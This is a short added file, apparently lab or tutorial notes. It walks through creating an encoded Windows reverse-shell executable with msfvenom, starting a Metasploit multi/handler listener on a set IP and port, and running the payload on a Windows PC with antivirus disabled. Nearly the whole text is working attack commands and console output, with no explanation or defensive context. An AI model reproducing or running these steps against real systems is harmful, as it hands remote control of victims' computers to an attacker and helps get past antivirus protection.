@@ -1,0 +1,18 @@
+Boot kali linux in pendrive and open it in PC. 
+Open metasploit and type exit command to quit. 
+The directory will change to root@kali. 
+Type the following command. 
+ 
+    1. msfvenom -a x86 --platform windows -p windows/shell/reverse_tcp 
+LHOST=192.168.9.191 LPORT=31337 -b "\x00" -e x86/shikata_ga_nai -f exe -o /tmp/1.exe 
+    2. msfconsole 
+    3. use exploit/multi/handler 
+    4. msf exploit(multi/handler) > set payload windows/shell/reverse_tcp 
+    5. payload => windows/shell/reverse_tcp 
+    6. Show options 
+    7. msf exploit(multi/handler) > set LHOST 192.168.9.191 
+    8. LHOST => 192.168.9.191 
+    9. msf exploit(multi/handler) > set LPORT 31337 
+    10. LPORT => 31337 
+    11. msf exploit(multi/handler) > exploit 
+PUT THE PAYLOAD GENEREATED IN A WINDOWS PC (MAKE SURE ANTIVIRUS IS OFF) AND RUN THE EXE FILE. 
